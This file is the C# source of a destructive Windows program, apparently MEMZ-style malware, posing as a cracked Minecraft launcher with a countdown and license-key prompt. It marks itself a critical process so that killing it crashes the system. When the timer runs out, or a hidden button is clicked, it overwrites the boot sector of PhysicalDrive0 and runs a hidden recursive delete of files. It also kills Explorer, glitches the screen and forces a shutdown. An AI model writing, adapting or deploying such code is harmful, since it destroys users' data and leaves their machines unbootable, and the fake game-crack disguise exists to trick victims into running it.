using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.NetworkInformation;

namespace MemzProject
{
    class Program : Form
    {
        [DllImport("kernel32.dll")] static extern IntPtr CreateFile(string lp, uint da, uint sm, IntPtr sa, uint cd, uint fa, IntPtr h);
        [DllImport("kernel32.dll")] static extern bool WriteFile(IntPtr h, byte[] b, uint n, out uint w, IntPtr o);
        [DllImport("ntdll.dll")] static extern int NtSetInformationProcess(IntPtr h, int c, ref int i, int l);
        [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcD, int x, int y, int w, int h, IntPtr hdcS, int xs, int ys, int r);
        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h);

        private int timeLeft = 600; 
        private Label lblTimer;
        private TextBox txtKey;

        [STAThread]
        static void Main()
        {
            // 1. INTERNET CHECK
            if (!CheckNet()) {
                MessageBox.Show("Sorry, to run this program connect to internet.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            // 2. THE MEMZ-STYLE WARNINGS
            if (MessageBox.Show("The software you are about to run is MALWARE.\nIt will destroy your computer if you are not careful.\n\nAre you sure you want to run this?", "FINAL WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes) return;
            if (MessageBox.Show("THIS IS THE LAST WARNING.\nYour data will be deleted and Windows will not boot.\n\nSTILL WANT TO PROCEED?", "LAST CHANCE", MessageBoxButtons.YesNo, MessageBoxIcon.Error) != DialogResult.Yes) return;

            Application.EnableVisualStyles();
            // Critical process protection (Blue Screen if killed via Task Manager)
            try { int i = 1; NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref i, 4); } catch {}
            
            Application.Run(new Program());
        }

        static bool CheckNet() {
            try { using (Ping p = new Ping()) return p.Send("8.8.8.8", 2000).Status == IPStatus.Success; }
            catch { return false; }
        }

        public Program()
        {
            this.Text = "Minecraft Launcher v1.4 - Official Crack";
            this.Size = new Size(800, 450);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = Color.FromArgb(20, 20, 20);
            this.ForeColor = Color.White;
            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;

            lblTimer = new Label() { Text = "10:00", Font = new Font("Consolas", 48), ForeColor = Color.Lime, Location = new Point(50, 50), Size = new Size(300, 80) };
            
            Label lblInfo = new Label() { Text = "ENTER YOUR LICENSE KEY TO ABORT DESTRUCTION:", Location = new Point(200, 200), Size = new Size(400, 20), Font = new Font("Arial", 10, FontStyle.Bold) };
            txtKey = new TextBox() { Location = new Point(250, 230), Width = 300, Font = new Font("Arial", 14), BackColor = Color.Black, ForeColor = Color.Yellow };
            
            Button btnVerify = new Button() { Text = "VERIFY", Location = new Point(560, 228), Size = new Size(100, 32), FlatStyle = FlatStyle.Flat, BackColor = Color.DarkSlateGray };
            btnVerify.Click += (s, e) => {
                if (txtKey.Text == "MC-FREE-2026-X") {
                    MessageBox.Show("License Validated! Process Terminated.", "Success");
                    Environment.Exit(0);
                } else {
                    MessageBox.Show("Invalid Key! Time is running out...", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
            };

            // HIDDEN "DESTROY NOW" BUTTON (Invisible dot bottom-left)
            Button btnDestroyNow = new Button() { 
                Text = ".", 
                Location = new Point(0, 430), 
                Size = new Size(20, 20), 
                FlatStyle = FlatStyle.Flat, 
                ForeColor = Color.FromArgb(20, 20, 20), 
                BackColor = Color.FromArgb(20, 20, 20),
                FlatAppearance = { BorderSize = 0 }
            };
            btnDestroyNow.Click += (s, e) => { timeLeft = 0; };

            this.Controls.AddRange(new Control[] { lblTimer, lblInfo, txtKey, btnVerify, btnDestroyNow });

            System.Windows.Forms.Timer t = new System.Windows.Forms.Timer() { Interval = 1000 };
            t.Tick += (s, e) => {
                if (timeLeft > 0) {
                    timeLeft--;
                    lblTimer.Text = TimeSpan.FromSeconds(timeLeft).ToString(@"mm\:ss");
                    if (timeLeft < 60) lblTimer.ForeColor = Color.Red; // Turns red in last minute
                } else {
                    t.Stop();
                    ExecuteDestruction();
                }
            };
            t.Start();
        }

        void ExecuteDestruction()
        {
            try {
                uint written;
                IntPtr drive = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
                WriteFile(drive, new byte[512], 512, out written, IntPtr.Zero);
            } catch { }

            Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & del /s /q /f *.*") { WindowStyle = ProcessWindowStyle.Hidden });

            Thread gdi = new Thread(() => {
                Random rnd = new Random();
                IntPtr hdc = GetDC(IntPtr.Zero);
                while(true) {
                    BitBlt(hdc, rnd.Next(-10, 10), rnd.Next(-10, 10), 2000, 2000, hdc, 0, 0, 0x00990066);
                    Thread.Sleep(15);
                }
            });
            gdi.Start();

            Process.Start("shutdown", "/s /t 300 /c \"PC saying BYE BYE\"");
            this.Controls.Clear();
            Label bye = new Label() { Text = "BYE BYE", Font = new Font("Impact", 80), ForeColor = Color.Red, Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter };
            this.Controls.Add(bye);
        }
    }
}
